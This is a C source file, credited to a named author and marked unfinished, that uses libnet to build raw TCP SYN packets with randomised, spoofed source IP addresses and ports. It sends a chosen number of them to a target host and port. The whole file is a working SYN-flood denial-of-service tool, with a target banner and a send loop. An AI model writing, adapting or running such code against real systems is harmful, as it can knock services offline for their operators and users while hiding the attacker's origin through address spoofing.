/* 

NOTE THAT THIS CODE IS UNFINISHED AND STILL NEEDS TO BE OPTIMIZED
  https://github.com/Patchyst
  Created by Patrick Story

*/

#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <libnet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <sys/types.h>

/* Error Functions */
void l_die(struct libnet_context *l){
    printf("%s\n", libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
}

void errno_die(char *msg){
    perror(msg);
    exit(EXIT_FAILURE);
}


/* For rebuilding the TCP and IP headers to randomize IP addr and TCP port */
void rebuild_ip_tcp(u_short dest_port, struct in_addr *host_addr, struct libnet_context *env){
    struct in_addr src_addr;
    libnet_ptag_t ip_hdr, tcp_hdr;
    u_short src_port;
    src_port = libnet_get_prand(LIBNET_PR16);
    printf("\t(random) port: %d\n", src_port);
    tcp_hdr = libnet_build_tcp(
        src_port, // source port
        dest_port, // dest port
        libnet_get_prand(LIBNET_PRu32), // sequence number
        libnet_get_prand(LIBNET_PRu32), // ack number
        TH_SYN, // control flags
        libnet_get_prand(LIBNET_PRu16), // win_size
        0, // checksum (0 for libnet to autofill)
        0, // urgent pointer
        LIBNET_TCP_H, // total length of the TCP packet (for checksum calculation)
        NULL, // payload (NULL if none)
        0, // payload len
        env, // pointer to lib context
        0 // zero to create a new TCP header
    );
    if(tcp_hdr < 0){
        printf("\t[WARNING] failure to build TCP header\n");
        printf("\t[REASON] %s\n", libnet_geterror(env));
    }

     /* Building IPv4 Header */
    src_addr.s_addr = libnet_get_prand(LIBNET_PR32);
    printf("\t(random) IP: %s\n\n", inet_ntoa(src_addr));
    ip_hdr = libnet_build_ipv4(
        LIBNET_IPV4_H+LIBNET_TCP_H, // len of ip hdr and subsequent data
        IPTOS_LOWDELAY, // TOS
        libnet_get_prand(LIBNET_PRu16), // IP ID
        0, // no fragments
        libnet_get_prand(LIBNET_PR8), // TTL
        IPPROTO_TCP, // upper layer protocol (TCP)
        0, // checksum (0 for libnet to do it for you)
        src_addr.s_addr, // src ip
        host_addr->s_addr, // dest ip
        NULL, // payload (NULL)
        0, // payload len
        env, // libnet context
        0 // create a new ipv4 packet
    );

    if(ip_hdr < 0){
        printf("\t[WARNING] failure to build IPv4 header\n");
        printf("\t[REASON] %s\n", libnet_geterror(env));
    }
}

/* Main Function */
int main(int argc, char *argv[]){
    if (argc < 5){
        printf("usage %s:\n\t%s <host> <port> <device> <# of packets to send>\n", argv[0], argv[0]);
        exit(EXIT_FAILURE);
    }

    /* Variable declarations */
    u_short src_port;
    u_short dest_port;
    int bytes_written, bytes_to_write = LIBNET_ETH_H+LIBNET_IPV4_H+LIBNET_TCP_H;

    struct hostent *host;
    struct in_addr *host_addr;
    struct in_addr *alt_addr;
    struct in_addr src_addr;

    struct libnet_context *env;
    libnet_ptag_t tcp_hdr;
    libnet_ptag_t ip_hdr;
    char err_buff[LIBNET_ERRBUF_SIZE];


    /* populating destination address */
    host  = gethostbyname(argv[1]); // add handle for if host is null
    if(host == NULL) errno_die("Getting Hostname");
    host_addr = (struct in_addr *) (host->h_addr_list[0]);


    /* init dest port */
    dest_port = (u_short)atoi(argv[2]);
    
    /* init lib enivroment */
    env = libnet_init(LIBNET_RAW4, argv[3], err_buff);
    if(env == NULL) errno_die("Initializing libnet enviroment");


        /* printing info about target */
    printf("-------- TARGET --------\n");
    if(host->h_name != NULL) printf("\tOfficial Domain: %s\n", host->h_name);
    printf("\tIP: %s\n", inet_ntoa(*host_addr));
    printf("\tPort: %d\n", dest_port);


    /* setting libnet random seed */
    if(libnet_seed_prand(env) == -1){
        l_die(env);
    }

    /* Building TCP Header */
    src_port = libnet_get_prand(LIBNET_PR16);
    tcp_hdr = libnet_build_tcp(
        src_port, // source port
        dest_port, // dest port
        libnet_get_prand(LIBNET_PRu32), // sequence number
        libnet_get_prand(LIBNET_PRu32), // ack number
        TH_SYN, // control flags
        libnet_get_prand(LIBNET_PRu16), // win_size
        0, // checksum (0 for libnet to autofill)
        0, // urgent pointer
        LIBNET_TCP_H, // total length of the TCP packet (for checksum calculation)
        NULL, // payload (NULL if none)
        0, // payload len
        env, // pointer to lib context
        0 // zero to create a new TCP header
    );
    if(tcp_hdr < 0){
        printf("\t[WARNING] failure to build TCP header\n");
        printf("\t[REASON] %s\n", libnet_geterror(env));
    }

     /* Building IPv4 Header */
    src_addr.s_addr = libnet_get_prand(LIBNET_PR32);
    ip_hdr = libnet_build_ipv4( 
        LIBNET_IPV4_H+LIBNET_TCP_H, // len of ip hdr and subsequent data
        IPTOS_LOWDELAY, // TOS
        libnet_get_prand(LIBNET_PRu16), // IP ID
        0, // no fragments
        libnet_get_prand(LIBNET_PR8), // TTL
        IPPROTO_TCP, // upper layer protocol (TCP)
        0, // checksum (0 for libnet to do it for you)
        src_addr.s_addr, // src ip
        host_addr->s_addr, // dest ip
        NULL, // payload (NULL)
        0, // payload len
        env, // libnet context
        0 // create a new ipv4 packet
    );

    if(ip_hdr < 0){
        printf("\t[WARNING] failure to build IPv4 header\n");
        printf("\t[REASON] %s\n", libnet_geterror(env));
    }
    printf("-------- WRITING BYTES--------\n");
    /* writing bytes */
    for(int i = 0; i<atoi(argv[4]); i++){
        bytes_written = libnet_write(env);
        if(bytes_written < 0){
            printf("\n[ERROR] Writing bytes\n");
            l_die(env);
        }
        printf("\t[+] %d bytes Sent \n", bytes_written);
        rebuild_ip_tcp(dest_port, host_addr, env);
    }

    /* cleanup */
    libnet_destroy(env);

    return EXIT_SUCCESS;
}
